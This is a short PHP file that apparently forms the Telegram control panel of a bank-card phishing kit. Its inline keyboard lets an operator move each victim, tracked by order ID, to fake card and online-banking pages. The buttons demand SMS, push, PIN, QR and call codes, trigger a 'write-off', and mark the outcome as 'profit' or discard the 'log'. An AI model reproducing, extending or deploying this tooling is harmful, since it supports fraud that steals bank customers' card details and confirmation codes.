<?php
    $keyboard = [
        "inline_keyboard" => [
            [
                ["text" => "👁", "callback_data" => "isOnlineButton_" . $orderid]
            ],
            [
                ["text" => "❌Фейк карта", "callback_data" => "fakeCard_" . $orderid], ["text" => "❌Фейк ЛК", "callback_data" => "fakeLK_" . $orderid]
            ],
            [
                ["text" => "💳Карта", "callback_data" => "goToCard_" . $orderid], ["text" => "🏦ЛК", "callback_data" => "goToLK_" . $orderid]
            ],
            [
                ["text" => "📌ПУШ", "callback_data" => "goToPush_" . $orderid], ["text" => "💬СМС", "callback_data" => "goToSMS_" . $orderid], ["text" => "💵Списание", "callback_data" => "goToPushSpis_" . $orderid]
            ],
            [
                ["text" => "📸QR", "callback_data" => "goToQR_" . $orderid], ["text" => "🕹КБ Код", "callback_data" => "goToKBCode_" . $orderid], ["text" => "☎️Звонок", "callback_data" => "goToCallCode_" . $orderid]
            ],
            [
                ["text" => "✉️PUSH MAIL", "callback_data" => "goToPushMail_" . $orderid],
                ["text" => "🔑PIN", "callback_data" => "goToPIN_" . $orderid]
            ],
            [
                ["text" => "👎Бомж", "callback_data" => "goToNoMoney_" . $orderid], ["text" => "🧲Ожидание", "callback_data" => "goToWaiting_" . $orderid]
            ],
            [
                ["text" => "🕖Отлёга", "callback_data" => "goToNoWaitVbiv_" . $orderid], ["text" => "🏁Последняя страница", "callback_data" => "goToLastPage_" . $orderid]
            ],
            [
                ["text" => "✅Успех", "callback_data" => "makeProfit_" . $orderid], ["text" => "❌Отказаться", "callback_data" => "kickLog_" . $orderid]
            ]
        ]
    ];
?>